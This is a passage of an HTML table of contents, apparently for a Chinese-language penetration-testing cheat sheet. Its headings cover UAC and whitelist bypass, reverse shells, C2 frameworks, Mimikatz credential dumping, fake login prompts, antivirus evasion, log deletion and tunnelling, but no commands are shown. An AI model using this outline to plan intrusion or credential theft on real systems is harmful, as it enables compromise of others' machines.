<li><a href="#sp_oacreate">sp_oacreate</a></li>
<li><a href="#%E6%B2%99%E7%9B%92%E6%89%A7%E8%A1%8C">沙盒执行</a></li>
<li><a href="#warsqlkit%E5%90%8E%E9%97%A8">WarSQLKit(后门)</a></li>
</ul>
</li>
<li><a href="#msf">MSF</a></li>
<li><a href="#bypass-uac">Bypass UAC</a><ul>
<li><a href="#msf">MSF</a></li>
<li><a href="#dccwbypassuac">DccwBypassUAC</a></li>
<li><a href="#k8uac">K8uac</a></li>
<li><a href="#cmstp">CMSTP</a></li>
<li><a href="#uacme">Uacme</a></li>
<li><a href="#bypass-uac">Bypass-UAC</a></li>
<li><a href="#dll-hijack">DLL hijack</a></li>
<li><a href="#silentcleanup">SilentCleanup</a></li>
<li><a href="#sdclt">Sdclt</a><ul>
<li><a href="#1">1</a></li>
<li><a href="#2">2</a></li>
</ul>
</li>
<li><a href="#makecabwusa">Makecab&amp;Wusa</a></li>
<li><a href="#clr-bypassuac">CLR BypassUAC</a></li>
<li><a href="#eventvwr%E5%8A%AB%E6%8C%81%E6%B3%A8%E5%86%8C%E8%A1%A8">eventvwr劫持注册表</a></li>
<li><a href="#web-delivery">Web Delivery</a></li>
<li><a href="#invoke-psuacme">Invoke-PsUACme</a></li>
</ul>
</li>
<li><a href="#whitelist%E7%99%BD%E5%90%8D%E5%8D%95">Whitelist(白名单)</a><ul>
<li><a href="#greatsct">GreatSCT</a></li>
<li><a href="#jsrat">JSRat</a></li>
<li><a href="#odbcconfexe">Odbcconf.exe</a></li>
<li><a href="#msiexecexe">Msiexec.exe</a></li>
<li><a href="#installutilexe">InstallUtil.exe</a></li>
<li><a href="#compilerexe">Compiler.exe</a><ul>
<li><a href="#1xml">1.xml</a></li>
<li><a href="#1tcp">1.tcp</a></li>
</ul>
</li>
<li><a href="#csc">Csc</a></li>
<li><a href="#regasm">Regasm</a></li>
<li><a href="#msbuild">Msbuild</a></li>
<li><a href="#winrm">Winrm</a></li>
<li><a href="#mshta">Mshta</a></li>
<li><a href="#regsvr32">Regsvr32</a></li>
<li><a href="#rundll32">Rundll32</a><ul>
<li><a href="#%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6">执行文件</a></li>
<li><a href="#%E6%97%A0%E5%BC%B9%E7%AA%97%E6%89%A7%E8%A1%8C">无弹窗执行</a></li>
<li><a href="#%E5%A2%9E%E5%88%A0%E6%B3%A8%E5%86%8C%E8%A1%A8">增删注册表</a></li>
<li><a href="#%E5%86%99%E6%96%87%E4%BB%B6">写文件</a></li>
<li><a href="#out-rundllcommand">Out-RundllCommand</a></li>
</ul>
</li>
<li><a href="#dotnettojscript">DotNetToJScript</a><ul>
<li><a href="#starfighters">StarFighters</a></li>
<li><a href="#%E7%BB%95%E8%BF%87amsi%E6%89%A7%E8%A1%8C">绕过AMSI执行</a></li>
</ul>
</li>
<li><a href="#wmic">WMIC</a></li>
<li><a href="#msxsl">Msxsl</a></li>
<li><a href="#cpl">CPL</a></li>
</ul>
</li>
<li><a href="#runas">Runas</a></li>
<li><a href="#%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96">令牌窃取</a><ul>
<li><a href="#msf">MSF</a></li>
<li><a href="#cobalt-strike">Cobalt strike</a></li>
</ul>
</li>
<li><a href="#%E5%AF%86%E7%A0%81%E7%AA%83%E5%8F%96">密码窃取</a><ul>
<li><a href="#%E4%BC%AA%E9%80%A0%E9%94%81%E5%B1%8F">伪造锁屏</a></li>
<li><a href="#%E4%BC%AA%E9%80%A0%E8%AE%A4%E8%AF%81%E6%A1%86">伪造认证框</a><ul>
<li><a href="#credsleaker">CredsLeaker</a></li>
<li><a href="#loginprompt">LoginPrompt</a></li>
<li><a href="#nishang-invoke-credentialsphish">Nishang-Invoke-CredentialsPhish</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#rottenpotato">RottenPotato</a></li>
<li><a href="#powerup">PowerUp</a></li>
<li><a href="#powerup-alwaysinstallelevated">Powerup-AlwaysInstallElevated</a></li>
<li><a href="#alwaysinstallelevated%E6%8F%90%E6%9D%83">AlwaysInstallElevated提权</a></li>
<li><a href="#trusted-service-paths">Trusted Service Paths</a></li>
<li><a href="#vulnerable-services">Vulnerable Services</a></li>
<li><a href="#sudo%E6%8F%90%E6%9D%83">Sudo提权</a></li>
<li><a href="#linux%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1">Linux计划任务</a></li>
<li><a href="#linux-suid%E6%8F%90%E6%9D%83">Linux SUID提权</a><ul>
<li><a href="#find">Find</a></li>
<li><a href="#nmap">NMAP</a></li>
<li><a href="#vim">VIM</a></li>
<li><a href="#bash">BASH</a></li>
<li><a href="#cpmv">CP/MV</a></li>
</ul>
</li>
<li><a href="#linux-etcpasswd%E6%8F%90%E6%9D%83">Linux /etc/passwd提权</a></li>
<li><a href="#linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83">Linux脏牛提权</a></li>
</ul>
</li>
<li><a href="#rdpfireawall">RDP&amp;Fireawall</a><ul>
<li><a href="#%E7%88%86%E7%A0%B4">爆破</a></li>
<li><a href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%BC%80%E5%90%AF">注册表开启</a></li>
<li><a href="#netsh%E5%90%AF%E5%8A%A8%E6%9C%8D%E5%8A%A1">NETSH启动服务</a></li>
<li><a href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E5%BC%80%E5%90%AF">注入点开启</a></li>
<li><a href="#msf%E5%BC%80%E5%90%AF">MSF开启</a></li>
<li><a href="#wmic%E5%BC%80%E5%90%AF">Wmic开启</a></li>
<li><a href="#%E9%98%B2%E7%81%AB%E5%A2%99">防火墙</a></li>
<li><a href="#%E5%A4%9A%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95">多用户登录</a></li>
<li><a href="#rdp%E8%BF%9E%E6%8E%A5%E8%AE%B0%E5%BD%95">RDP连接记录</a></li>
<li><a href="#%E5%88%A0%E9%99%A4%E7%97%95%E8%BF%B9">删除痕迹</a></li>
</ul>
</li>
<li><a href="#%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%E8%BD%AC%E5%8F%91">端口映射&amp;转发</a><ul>
<li><a href="#msf">MSF</a></li>
<li><a href="#lcxexe">lcx.exe</a></li>
<li><a href="#ssh">SSH</a><ul>
<li><a href="#%E6%AD%A3%E5%90%91%E8%BD%AC%E5%8F%91">正向转发</a></li>
<li><a href="#%E5%8F%8D%E5%90%91%E8%BD%AC%E5%8F%91">反向转发</a></li>
</ul>
</li>
<li><a href="#invoke-socksproxy">Invoke-SocksProxy</a></li>
<li><a href="#ssf">SSF</a><ul>
<li><a href="#%E5%8D%95%E5%B1%82%E7%BD%91%E7%BB%9C%E6%AD%A3%E5%90%91%E8%BD%AC%E5%8F%91">单层网络正向转发</a></li>
<li><a href="#%E5%8D%95%E5%B1%82%E7%BD%91%E7%BB%9C%E5%8F%8D%E5%90%91%E8%BD%AC%E5%8F%91">单层网络反向转发</a></li>
</ul>
</li>
<li><a href="#netsh">Netsh</a></li>
<li><a href="#iptables">Iptables</a></li>
<li><a href="#chisel">chisel </a></li>
</ul>
</li>
<li><a href="#%E5%91%BD%E4%BB%A4%E6%8E%A7%E5%88%B6">命令&amp;控制</a><ul>
<li><a href="#interactive-shell">Interactive shell</a></li>
<li><a href="#script-reverse-shell">Script reverse shell</a><ul>
<li><a href="#bash">bash</a></li>
<li><a href="#nc">nc</a></li>
<li><a href="#telnet">telnet</a></li>
<li><a href="#php">php</a></li>
<li><a href="#python">python</a></li>
<li><a href="#perl">perl</a></li>
<li><a href="#ruby">ruby</a></li>
</ul>
</li>
<li><a href="#openssl-encrypt-shell">OpenSSL encrypt shell</a><ul>
<li><a href="#linux">Linux</a></li>
<li><a href="#windows">Windows</a></li>
</ul>
</li>
<li><a href="#dnscat2">Dnscat2</a><ul>
<li><a href="#powercat">Powercat</a></li>
<li><a href="#dnscat2-exe">Dnscat2 exe</a></li>
</ul>
</li>
<li><a href="#dns-txt-command">DNS TXT Command</a></li>
<li><a href="#powershell">Powershell</a><ul>
<li><a href="#msfpowershell">MSF+Powershell</a></li>
<li><a href="#powercat">Powercat</a></li>
<li><a href="#nishang">Nishang</a><ul>
<li><a href="#bind-shell">Bind shell</a></li>
<li><a href="#%E5%8F%8D%E5%90%91shell">反向shell</a></li>
<li><a href="#udp%E5%8F%8D%E5%90%91shell">UDP反向shell</a></li>
<li><a href="#https">HTTPS</a></li>
<li><a href="#icmp">ICMP</a></li>
</ul>
</li>
<li><a href="#base64">Base64</a></li>
</ul>
</li>
<li><a href="#metasploit">Metasploit</a><ul>
<li><a href="#%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8">常规使用</a></li>
<li><a href="#%E6%8A%80%E5%B7%A7%E4%BD%BF%E7%94%A8">技巧使用</a></li>
<li><a href="#%E6%A8%A1%E5%9D%97">模块</a><ul>
<li><a href="#auxiliary">Auxiliary</a></li>
<li><a href="#payload">Payload</a><ul>
<li><a href="#windows">Windows</a></li>
<li><a href="#linux">Linux</a></li>
<li><a href="#macos">MacOS</a></li>
<li><a href="#web">Web</a></li>
<li><a href="#android">Android</a></li>
<li><a href="#shellcode">shellcode</a></li>
<li><a href="#msf%E8%AE%BE%E7%BD%AE%E7%9B%91%E5%90%AC">msf设置监听</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#meterpreter">Meterpreter</a><ul>
<li><a href="#%E4%BA%A4%E4%BA%92">交互</a></li>
<li><a href="#%E6%8F%90%E6%9D%83">提权</a></li>
<li><a href="#%E5%91%BD%E4%BB%A4">命令</a></li>
<li><a href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C">文件操作</a></li>
<li><a href="#%E5%90%8E%E6%B8%97%E9%80%8F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81">后渗透&amp;权限维持</a></li>
<li><a href="#%E6%B8%85%E7%90%86%E6%97%A5%E5%BF%97">清理日志</a></li>
</ul>
</li>
<li><a href="#msf%E6%B4%BE%E7%94%9Fcobalt-strike%E5%92%8Cempire">MSF派生Cobalt strike和Empire</a><ul>
<li><a href="#%E6%B4%BE%E7%94%9Fempire">派生Empire</a></li>
<li><a href="#%E6%B4%BE%E7%94%9Fcobalt-strike">派生Cobalt Strike</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#empire">Empire</a><ul>
<li><a href="#%E5%AE%89%E8%A3%85">安装</a></li>
<li><a href="#%E7%9B%91%E5%90%AC">监听</a></li>
<li><a href="#%E7%94%9F%E6%88%90">生成</a></li>
<li><a href="#%E8%BF%9E%E6%8E%A5%E9%9D%B6%E6%9C%BA%E5%8F%8A%E5%85%B6%E4%BB%96%E6%93%8D%E4%BD%9C">连接靶机及其他操作</a></li>
<li><a href="#%E6%8F%90%E6%9D%83">提权</a></li>
<li><a href="#%E6%A8%AA%E5%90%91">横向</a><ul>
<li><a href="#%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96">令牌窃取</a></li>
<li><a href="#%E4%BC%9A%E8%AF%9D%E6%B3%A8%E5%85%A5">会话注入</a></li>
<li><a href="#hash%E4%BC%A0%E9%80%92">Hash传递</a></li>
</ul>
</li>
<li><a href="#%E5%90%8E%E9%97%A8%E6%8C%81%E4%B9%85%E5%8C%96">后门&amp;持久化</a><ul>
<li><a href="#%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81">映像劫持</a></li>
<li><a href="#%E6%B3%A8%E5%85%A5%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%90%AF%E5%8A%A8%E9%A1%B9">注入注册表启动项</a></li>
<li><a href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1">计划任务</a></li>
<li><a href="#wmi">WMI</a></li>
<li><a href="#%E6%B3%A8%E5%85%A5ssp">注入SSP</a></li>
</ul>
</li>
<li><a href="#collection%E4%BF%A1%E6%81%AF%E9%87%87%E9%9B%86">Collection（信息采集）</a></li>
<li><a href="#code_execution%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">Code_execution（代码执行）</a></li>
<li><a href="#credentials%E8%BA%AB%E4%BB%BD%E5%87%AD%E8%AF%81">Credentials（身份凭证）</a></li>
<li><a href="#exfiltration%E6%95%B0%E6%8D%AE%E7%AA%83%E5%8F%96">Exfiltration（数据窃取）</a></li>
<li><a href="#exploitation%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8exp">Exploitation（漏洞利用EXP）</a></li>
<li><a href="#lateral_movement%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8">Lateral_movement（横向移动）</a></li>
<li><a href="#management%E7%AE%A1%E7%90%86">Management（管理）</a></li>
<li><a href="#persistence%E6%8C%81%E4%B9%85%E5%8C%96">Persistence（持久化）</a></li>
<li><a href="#privesc%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">Privesc（权限提升）</a></li>
<li><a href="#recon%E4%BE%A6%E5%AF%9F">Recon（侦察）</a></li>
<li><a href="#situational_awareness%E6%80%81%E5%8A%BF%E6%84%9F%E7%9F%A5">Situational_awareness（态势感知）</a></li>
<li><a href="#trollsploit%E6%81%B6%E4%BD%9C%E5%89%A7">Trollsploit（恶作剧）</a></li>
<li><a href="#empire-word">Empire Word</a></li>
<li><a href="#empire%E6%B4%BE%E7%94%9Fcobalt-strike%E5%92%8Cmsf">Empire派生Cobalt Strike和MSF</a><ul>
<li><a href="#%E6%B4%BE%E7%94%9Fmsf">派生MSF</a></li>
<li><a href="#%E6%B4%BE%E7%94%9Fcobalt-strike">派生Cobalt Strike</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#cobalt-strike">Cobalt Strike</a><ul>
<li><a href="#%E5%AE%89%E8%A3%85">安装</a></li>
<li><a href="#%E9%83%A8%E7%BD%B2teamserver">部署TeamServer</a></li>
<li><a href="#%E6%A8%A1%E5%9D%97">模块</a></li>
<li><a href="#%E8%BF%9E%E6%8E%A5">连接</a></li>
<li><a href="#%E7%9B%91%E5%90%AC%E5%99%A8">监听器</a></li>
<li><a href="#%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97">攻击模块</a></li>
<li><a href="#%E8%A7%86%E5%9B%BE%E6%A8%A1%E5%9D%97">视图模块</a></li>
<li><a href="#%E4%BA%A4%E4%BA%92">交互</a></li>
<li><a href="#beacon">Beacon</a></li>
<li><a href="#%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99">克隆网站</a></li>
<li><a href="#office%E5%AE%8F">office宏</a></li>
<li><a href="#%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6">钓鱼邮件</a></li>
<li><a href="#%E5%8A%A0%E8%BD%BD%E8%84%9A%E6%9C%AC">加载脚本</a></li>
<li><a href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81">浏览器劫持</a></li>
<li><a href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81">权限维持</a></li>
<li><a href="#%E6%A8%AA%E5%90%91">横向</a></li>
<li><a href="#%E9%9A%94%E7%A6%BB%E7%BD%91%E7%BB%9C">隔离网络</a><ul>
<li><a href="#%E6%9D%83%E9%99%90%E6%9C%BA%E4%B8%AD%E8%BD%AC">权限机中转</a></li>
<li><a href="#smb_beacon">SMB_beacon</a></li>
<li><a href="#ssh-login">SSH login</a></li>
</ul>
</li>
<li><a href="#%E4%BB%A3%E7%90%86">代理</a></li>
<li><a href="#%E9%83%A8%E7%BD%B2vpn">部署VPN</a></li>
<li><a href="#cobalt-strike%E6%B4%BE%E7%94%9F-empire%E5%92%8Cmsf">Cobalt strike派生 Empire和MSF</a><ul>
<li><a href="#%E6%B4%BE%E7%94%9Fempire">派生Empire</a></li>
<li><a href="#%E6%B4%BE%E7%94%9Fmsf">派生MSF</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#jsrat">JSRat</a></li>
<li><a href="#crackmapexec">CrackMapExec</a><ul>
<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a></li>
<li><a href="#%E7%88%86%E7%A0%B4">爆破</a></li>
<li><a href="#%E5%8F%AF%E7%94%A8%E6%A8%A1%E5%9D%97">可用模块</a></li>
<li><a href="#pth">PTH</a></li>
<li><a href="#%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4">执行命令</a></li>
</ul>
</li>
<li><a href="#koadic">koadic</a></li>
<li><a href="#silenttrinity">SILENTTRINITY</a></li>
<li><a href="#browser-c2">Browser C2</a></li>
<li><a href="#dropbox-c2">DropBox C2</a></li>
<li><a href="#gmail-c2">Gmail C2</a><ul>
<li><a href="#gcat">Gcat</a></li>
<li><a href="#gdog">Gdog</a></li>
</ul>
</li>
<li><a href="#telegram-c2">Telegram C2</a></li>
</ul>
</li>
<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a><ul>
<li><a href="#cmd">Cmd</a></li>
<li><a href="#wmi">Wmi</a></li>
<li><a href="#powerview">PowerView</a></li>
<li><a href="#linux">Linux</a></li>
</ul>
</li>
<li><a href="#http%E6%9C%8D%E5%8A%A1">HTTP服务</a></li>
<li><a href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C">文件操作</a><ul>
<li><a href="#windows%E6%9F%A5%E6%89%BE%E6%96%87%E4%BB%B6">Windows查找文件</a></li>
<li><a href="#linux%E6%9F%A5%E6%89%BE%E6%96%87%E4%BB%B6">Linux查找文件</a></li>
<li><a href="#%E5%88%9B%E5%BB%BA">创建</a></li>
<li><a href="#%E5%8E%8B%E7%BC%A9">压缩</a></li>
<li><a href="#%E8%A7%A3%E5%8E%8B">解压</a></li>
<li><a href="#%E4%BC%A0%E8%BE%93">传输</a><ul>
<li><a href="#ftp">FTP</a></li>
<li><a href="#vbs">VBS</a></li>
<li><a href="#js">JS</a></li>
<li><a href="#bitsadmin">Bitsadmin</a></li>
<li><a href="#powershell">Powershell </a><ul>
<li><a href="#1">1</a></li>
<li><a href="#2">2</a></li>
<li><a href="#3">3</a></li>
<li><a href="#4">4</a></li>
<li><a href="#5">5</a></li>
</ul>
</li>
<li><a href="#certutil">Certutil</a></li>
<li><a href="#python">Python</a></li>
<li><a href="#perl">Perl</a></li>
<li><a href="#php">PHP</a></li>
<li><a href="#curl">Curl</a></li>
<li><a href="#wget">wget</a></li>
<li><a href="#nc">nc </a></li>
<li><a href="#scp">SCP</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#hash%E5%AF%86%E7%A0%81">Hash&amp;密码</a><ul>
<li><a href="#%E7%A0%B4%E8%A7%A3%E7%BD%91%E5%9D%80">破解网址</a></li>
<li><a href="#googlecolab%E7%A0%B4%E8%A7%A3hash">GoogleColab破解hash</a></li>
<li><a href="#%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5">密码策略</a></li>
<li><a href="#%E5%BC%80%E5%90%AFwdigest">开启Wdigest </a><ul>
<li><a href="#cmd">Cmd</a></li>
<li><a href="#powershell">powershell</a></li>
<li><a href="#meterpreter">meterpreter</a></li>
</ul>
</li>
<li><a href="#getpass">Getpass</a></li>
<li><a href="#quarkspwdump">QuarksPwDump</a></li>
<li><a href="#msf">MSF</a></li>
<li><a href="#empire">Empire</a></li>
<li><a href="#invoke-dcsync">Invoke-Dcsync</a></li>
<li><a href="#mimikatz">Mimikatz</a><ul>
<li><a href="#%E8%B0%83%E7%94%A8mimikatz%E8%BF%9C%E7%A8%8B%E6%8A%93%E5%8F%96">调用mimikatz远程抓取</a></li>
<li><a href="#%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8F%E6%8A%93hash">横向批量抓hash</a><ul>
<li><a href="#schtasks">Schtasks</a></li>
<li><a href="#wmic">Wmic</a></li>
</ul>
</li>
<li><a href="#%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8">直接使用</a></li>
<li><a href="#powershell-bypass">Powershell Bypass</a></li>
<li><a href="#net-20">.net 2.0</a></li>
<li><a href="#net-40-msbuild">.net 4.0 Msbuild</a></li>
<li><a href="#jscript">JScript</a></li>
<li><a href="#procdump64mimikatz">Procdump64+mimikatz</a></li>
<li><a href="#dumpert">Dumpert</a></li>
<li><a href="#cisco-jabber%E8%BD%AC%E5%82%A8lsass">Cisco Jabber转储lsass</a></li>
<li><a href="#%E7%BB%95%E8%BF%87%E5%8D%A1%E5%B7%B4%E6%96%AF%E5%9F%BA">绕过卡巴斯基</a></li>
<li><a href="#%E8%BF%9C%E7%A8%8Blsass%E8%BF%9B%E7%A8%8B%E8%BD%AC%E5%82%A8-physmem2profit">远程LSASS进程转储-Physmem2profit</a></li>
<li><a href="#sqldumpermimikatz">SqlDumper+mimikatz</a></li>
<li><a href="#mimipenguin">Mimipenguin</a></li>
</ul>
</li>
<li><a href="#%E7%BC%93%E5%AD%98hash%E6%8F%90%E5%8F%96">缓存hash提取</a><ul>
<li><a href="#%E6%B3%A8%E5%86%8C%E8%A1%A8">注册表</a></li>
<li><a href="#ninjacopy">Ninjacopy</a></li>
<li><a href="#quarks-pwdump">Quarks-pwdump</a></li>
</ul>
</li>
<li><a href="#%E5%9F%9Fhash%E6%8F%90%E5%8F%96">域hash提取</a><ul>
<li><a href="#ntdsutil">Ntdsutil</a></li>
<li><a href="#vssadmin">Vssadmin</a></li>
<li><a href="#impacket">Impacket</a></li>
<li><a href="#ntdsdumpex">NTDSDumpex</a></li>
<li><a href="#wmi%E8%B0%83%E7%94%A8vssadmin">WMI调用Vssadmin</a></li>
<li><a href="#powersploit">PowerSploit</a></li>
<li><a href="#nishang">Nishang</a></li>
<li><a href="#mimikatz">Mimikatz</a></li>
<li><a href="#msf">MSF</a></li>
</ul>
</li>
<li><a href="#lazagne">laZagne</a><ul>
<li><a href="#windows">windows</a></li>
<li><a href="#linux">Linux</a></li>
</ul>
</li>
<li><a href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF">敏感信息</a><ul>
<li><a href="#seatbelt">Seatbelt</a></li>
<li><a href="#vnc%E5%AF%86%E7%A0%81">VNC密码</a></li>
<li><a href="#navicat%E4%BF%A1%E6%81%AF">Navicat信息</a></li>
<li><a href="#chrome%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81">Chrome保存的密码</a></li>
<li><a href="#foxmail">Foxmail</a></li>
<li><a href="#firefox%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81">firefox保存的密码</a></li>
<li><a href="#securecrt">SecureCRT</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E6%A8%AA%E5%90%91">横向</a><ul>
<li><a href="#%E6%8E%A2%E6%B5%8B%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA">探测存活主机</a><ul>
<li><a href="#forping%E5%91%BD%E4%BB%A4%E6%9F%A5%E8%AF%A2%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA">For+Ping命令查询存活主机</a></li>
<li><a href="#nbtscan">NbtScan</a></li>
<li><a href="#nmap">NMAP</a><ul>
<li><a href="#%E4%BB%A3%E7%90%86nmap%E6%89%AB%E6%8F%8F">代理nmap扫描</a></li>
</ul>
</li>
<li><a href="#netdiscover">NetDiscover</a></li>
<li><a href="#rp-scan">rp-scan</a></li>
<li><a href="#msf">MSF</a></li>
</ul>
</li>
<li><a href="#%E6%8E%A2%E6%B5%8B%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%A3">探测服务&amp;端口</a><ul>
<li><a href="#powershell">Powershell</a><ul>
<li><a href="#powersploit">Powersploit</a></li>
<li><a href="#nishang">Nishang </a></li>
</ul>
</li>
<li><a href="#smb">SMB </a><ul>
<li><a href="#msf">MSF</a></li>
<li><a href="#nmap">NMAP</a></li>
<li><a href="#cmd">CMD</a></li>
</ul>
</li>
<li><a href="#linux-samba%E6%9C%8D%E5%8A%A1">Linux Samba服务</a></li>
<li><a href="#msf">MSF</a><ul>
<li><a href="#%E7%AB%AF%E5%8F%A3">端口</a></li>
<li><a href="#%E6%9C%8D%E5%8A%A1">服务</a></li>
</ul>
</li>
<li><a href="#nc">Nc</a></li>
<li><a href="#masscan">Masscan</a></li>
<li><a href="#ptscan">PTScan</a></li>
<li><a href="#cobaltstrikek8-aggressor">CobaltStrike+K8 Aggressor</a><ul>
<li><a href="#%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA">存活主机</a></li>
<li><a href="#ms17010">MS17010</a></li>
<li><a href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF">操作系统信息</a></li>
<li><a href="#%E5%86%85%E7%BD%91%E7%AB%99%E7%82%B9banner%E6%A0%87%E9%A2%98%E6%89%AB%E6%8F%8F">内网站点banner、标题扫描</a></li>
<li><a href="#ftp%E7%88%86%E7%A0%B4">FTP爆破</a></li>
<li><a href="#wmi%E7%88%86%E7%A0%B4windows%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81">WMI爆破windows账户密码</a></li>
<li><a href="#%E6%80%9D%E7%A7%91%E8%AE%BE%E5%A4%87%E6%89%AB%E6%8F%8F">思科设备扫描</a></li>
<li><a href="#%E6%9E%9A%E4%B8%BE%E5%85%B1%E4%BA%AB">枚举共享</a></li>
<li><a href="#%E6%9E%9A%E4%B8%BEsql-server%E6%95%B0%E6%8D%AE%E5%BA%93">枚举SQL SERVER数据库</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4ipc%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1">执行命令&amp;IPC&amp;计划任务</a><ul>
<li><a href="#at">AT</a></li>
<li><a href="#schtasks">Schtasks</a></li>
<li><a href="#wmic">WMIC</a></li>
</ul>
</li>
<li><a href="#%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E7%99%BB%E8%BF%87%E7%9A%84%E6%9C%BA%E5%99%A8">快速定位域管理登过的机器</a></li>
<li><a href="#msf%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1">MSF添加路由</a></li>
<li><a href="#msf%E7%AE%A1%E9%81%93%E7%9B%91%E5%90%AC">MSF管道监听</a></li>
<li><a href="#%E4%BB%A3%E7%90%86">代理</a><ul>
<li><a href="#ssh">SSH</a><ul>
<li><a href="#%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86">正向代理</a></li>
<li><a href="#%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86">反向代理</a></li>
<li><a href="#ssh%E9%9A%A7%E9%81%93rc4%E5%8F%8C%E9%87%8D%E5%8A%A0%E5%AF%86">SSH隧道+rc4双重加密</a></li>
<li><a href="#%E5%85%AC%E7%BD%91ssh%E9%9A%A7%E9%81%93local-msf">公网SSH隧道+Local MSF</a></li>
</ul>
</li>
<li><a href="#socks4a">socks4a</a></li>
<li><a href="#socks5">socks5</a></li>
<li><a href="#%E5%9F%BA%E4%BA%8Eweb%E7%9A%84socks5">基于web的socks5 </a><ul>
<li><a href="#regeorg">reGeorg</a></li>
<li><a href="#neo-regeorg">Neo-reGeorg</a></li>
<li><a href="#abptts%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91">ABPTTS端口转发</a></li>
<li><a href="#tunna%E8%BD%AC%E5%8F%91">Tunna转发</a></li>
</ul>
</li>
<li><a href="#earthworm">Earthworm</a><ul>
<li><a href="#%E6%AD%A3%E5%90%91%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%AD%98%E5%9C%A8%E5%A4%96%E7%BD%91ip">正向(目标机存在外网IP)：</a></li>
<li><a href="#%E5%8F%8D%E5%BC%B9socks5%E7%9B%AE%E6%A0%87%E6%9C%BA%E6%97%A0%E5%A4%96%E7%BD%91ip">反弹socks5(目标机无外网IP)：</a></li>
<li><a href="#%E4%BA%8C%E7%BA%A7%E7%8E%AF%E5%A2%83a%E6%9C%89%E5%A4%96%E7%BD%91b%E5%86%85%E7%BD%91%E6%97%A0%E5%A4%96%E7%BD%91">二级环境(A有外网，B内网无外网)：</a></li>
<li><a href="#%E4%BA%8C%E7%BA%A7%E7%8E%AF%E5%A2%83a%E6%97%A0%E5%A4%96%E7%BD%91b%E5%86%85%E7%BD%91%E6%97%A0%E5%A4%96%E7%BD%91">二级环境(A无外网，B内网无外网)：</a></li>
<li><a href="#%E4%B8%89%E7%BA%A7%E7%8E%AF%E5%A2%83a%E6%97%A0%E5%A4%96%E7%BD%91b%E5%86%85%E7%BD%91%E6%97%A0%E5%A4%96%E7%BD%91%E9%80%9Aac%E9%80%9Ab">三级环境(A无外网,B内网无外网通A,C通B)：</a></li>
</ul>
</li>
<li><a href="#frp">Frp </a></li>
<li><a href="#ssf">SSF</a><ul>
<li><a href="#%E6%AD%A3%E5%90%91socks%E4%BB%A3%E7%90%86">正向socks代理</a></li>
<li><a href="#%E5%8F%8D%E5%90%91socks%E4%BB%A3%E7%90%86">反向socks代理</a></li>
<li><a href="#%E5%A4%9A%E7%BA%A7%E7%BA%A7%E8%81%94">多级级联</a></li>
<li><a href="#%E5%8F%8D%E5%BC%B9shell">反弹shell</a></li>
</ul>
</li>
<li><a href="#shadowsocks">Shadowsocks</a></li>
<li><a href="#goproxy">Goproxy</a></li>
<li><a href="#chisel">Chisel</a></li>
<li><a href="#%E4%BB%A3%E7%90%86%E8%BD%AF%E4%BB%B6">代理软件</a></li>
</ul>
</li>
<li><a href="#ngrok%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F">Ngrok内网穿透</a></li>
<li><a href="#ms17-010">MS17-010</a></li>
<li><a href="#ms08_067">MS08_067</a></li>
